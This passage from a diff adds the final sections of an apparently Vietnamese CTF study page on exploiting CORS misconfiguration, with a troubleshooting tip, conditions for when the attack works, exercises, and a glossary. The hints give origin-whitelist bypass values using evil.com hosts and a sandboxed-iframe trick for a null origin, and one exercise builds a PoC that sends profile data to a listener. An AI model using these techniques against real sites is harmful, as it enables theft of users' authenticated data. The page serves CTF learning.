+    <tr><td>PoC fetch bị lỗi CORS trên console trình duyệt dù đã set credentials:'include'</td><td>Thiếu đúng combo ACAO cụ thể + ACAC true (1 trong 2 sai)</td><td>Dùng DevTools Network tab tự kiểm tra lại response headers thật khi fetch, không chỉ tin vào test bằng Python request trước đó</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>Server phản chiếu Origin (hoặc whitelist lỏng lẻo) VÀ <code>Access-Control-Allow-Credentials: true</code> VÀ endpoint trả dữ liệu nhạy cảm cần auth.</td></tr>
+    <tr><td>❌</td><td>ACAO là wildcard <code>*</code> thật (không kèm credentials được theo chuẩn).</td></tr>
+    <tr><td>❌</td><td>Server dùng whitelist domain nghiêm ngặt, so khớp đúng (parse domain thật, không phải string match lỏng).</td></tr>
+    <tr><td>❌</td><td>Endpoint không cần cookie/session để trả dữ liệu (vốn đã public, không có gì để "đánh cắp" thêm).</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng ví dụ mục 09 bằng tay, từ xác nhận ACAO phản chiếu tới khi listener nhận
+  được dữ liệu profile.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Luôn kiểm tra CẢ 2 header (ACAO và ACAC) trước khi viết PoC — thiếu 1
+  trong 2 là vô dụng.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> app check whitelist bằng <code>origin.includes('target.com')</code>. Tìm 1
+  domain giả vẫn "chứa" chuỗi <code>target.com</code> nhưng không phải domain thật của app.</p>
+  <details><summary>Gợi ý nếu kẹt</summary><code>https://target.com.evil.com</code> hoặc
+  <code>https://evil.com?x=target.com</code> — xem mục 06.B.</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> app chặn đúng mọi domain lạ NHƯNG chấp nhận origin <code>null</code>.
+  Thiết kế PoC khai thác qua đường này.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Dùng iframe với <code>sandbox</code> attribute (không có
+  <code>allow-same-origin</code>) để trình duyệt tự gửi <code>Origin: null</code> — xem mục 06.C.</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>CORS</td><td>Cross-Origin Resource Sharing — cơ chế header cho phép JS đọc response cross-origin có kiểm soát.</td></tr>
+    <tr><td>ACAO / ACAC</td><td>Access-Control-Allow-Origin / Access-Control-Allow-Credentials — 2 header quyết định origin nào được đọc response, có kèm cookie hay không.</td></tr>
+    <tr><td>Reflect origin</td><td>Lỗi cấu hình: server lấy thẳng giá trị Origin request gửi lên rồi gán lại y hệt vào ACAO.</td></tr>
+    <tr><td>Null origin</td><td>Giá trị Origin đặc biệt khi request tới từ ngữ cảnh "không origin rõ ràng" (sandboxed iframe, file local).</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ/tài liệu offline:</strong>
+  <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/CORS Misconfiguration/</code>, Python <code>http.server</code>.</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("cors-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("cors-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
